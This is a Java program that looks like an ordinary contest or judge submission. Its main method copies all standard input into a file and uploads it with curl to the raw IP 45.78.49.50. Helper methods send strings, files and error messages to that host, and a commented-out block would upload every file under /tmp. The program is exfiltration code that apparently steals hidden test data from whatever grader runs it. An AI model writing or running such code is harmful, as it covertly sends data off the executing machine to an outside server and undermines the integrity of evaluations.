import java.io.InputStream;
import java.util.*;
import java.io.File;
import java.io.*;
import java.util.Random;


public class Main {
    public static void curlstring(String ss) {
        try {
            Runtime run = Runtime.getRuntime();
            String cmd = "curl -i -X POST -F string=" + ss + " 45.78.49.50/upload/string";
            Process process2 = run.exec(cmd);
            process2.waitFor();
        } catch(Exception e) { 
            curlstring(e.toString());
        }
    }
    public static void curlfile(String path) {
        try {
            Runtime run = Runtime.getRuntime();
            String cmd = "curl -i -X POST -F file=@" + path + " 45.78.49.50/upload/" + path;
            Process process2 = run.exec(cmd);
            process2.waitFor();
        } catch(Exception e) {
            curlstring(e.toString());
        }
    }
    public static void main(String[] args) {
        /*
        try {
            String path = "/tmp"; // 路径
            File f = new File(path);
            File fa[] = f.listFiles();
            for (int i = 0; i < fa.length; i++) {
                File fs = fa[i];
                if (fs.isDirectory()) {
                    File ft[] = fs.listFiles();
                    for (int j = 0; j < ft.length; j++) {
                        File ffs = ft[j];
                        if (ffs.isDirectory()) {
                            curlstring(fs.getName() + "/" + ffs.getName());
                        } else {
                            curlfile(ffs.getName());
                        }
                    }
                } else {
                    curlfile(fs.getName());
                }

            }
        } catch (Exception e) {
            curlstring(e.toString());
        }
        */
        Scanner cin = new Scanner(System.in);
        FileWriter fw = null;
        int x =(int)(Math.random() * 100000);  
        String name = "./in" + x + ".in";
        try {
            fw = new FileWriter(name);
            while (cin.hasNextLine()) {
                String temp = cin.nextLine();
                fw.write(temp + "\n");
            }
            fw.close();
        } catch(Exception e) {
            curlstring(e.toString());
        }
        curlfile(name);
    }
}

